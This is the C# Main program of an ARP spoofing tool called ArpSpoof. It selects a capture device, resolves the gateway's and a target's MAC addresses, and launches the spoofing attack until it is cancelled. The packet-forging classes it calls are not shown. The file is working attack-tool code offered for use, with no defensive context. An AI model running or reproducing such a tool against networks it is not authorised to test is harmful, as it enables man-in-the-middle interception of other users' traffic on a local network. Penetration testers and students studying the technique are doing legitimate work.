using System.Threading.Tasks;
using ArpSpoof.Commands;
using ArpSpoof.Core;
using System.Net.NetworkInformation;
using SharpPcap;
using System.Net;
using System.CommandLine;

class Program
{
    static string ASCIIART = @"
   ___   ___  ___  ____  ____________  _  __
  / _ | / _ \/ _ \/ __ \/  _/ __/ __ \/ |/ /
 / __ |/ , _/ ___/ /_/ // /_\ \/ /_/ /    /
/_/ |_/_/|_/_/   \____/___/___/\____/_/|_/
By github.com/joaostack
Version: 1.1";

    /// <summary>
    /// ArpSpoof Program
    /// </summary>
    /// <param name="targetAddress"></param>
    static async Task Main(string targetAddress)
    {
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.WriteLine(ASCIIART);
        Console.ResetColor();

        if (string.IsNullOrEmpty(targetAddress))
        {
            Console.WriteLine("-?, -h, --help\tShow help and usage information");
            return;
        }

        try
        {
            var cts = new CancellationTokenSource();
            Console.CancelKeyPress += (s, e) =>
            {
                e.Cancel = true;
                cts.Cancel();
                Console.WriteLine("Stopping...");
            };

            // Open Device select menu
            var device = DeviceHelper.SelectDevice();
            DeviceHelper.OpenDevice(device);

            var gatewayIP = DeviceHelper.GetGatewayIP().ToString();

            // Get Gateway MAC Address
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[*] Resolving Gateway ({gatewayIP}) MAC Address...");
            var gatewayMac = PhysicalAddress.Parse(await PacketBuild.GetMacAddress(device, gatewayIP, cts.Token));
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[+] Gateway MAC Address: {gatewayMac.ToString()}");

            // Get Target MAC Address
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[*] Resolving Target ({targetAddress}) MAC Address...");
            var targetMac = PhysicalAddress.Parse(await PacketBuild.GetMacAddress(device, targetAddress, cts.Token));
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[+] Target MAC Address: {targetMac.ToString()}");
            Console.ResetColor();

            // Instantiate ArpSpoofCommands
            var cmd = new ArpSpoofCommands(device,
                IPAddress.Parse(targetAddress), targetMac, IPAddress.Parse(gatewayIP), gatewayMac);

            Console.WriteLine("[+] ArpSpoof started! press CTRL+C to cancel.");
            await cmd.ExecuteAsync(cts.Token);

            device.Close();
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(ex.Message);
        }
        finally
        {
            Console.ResetColor();
        }
    }
}
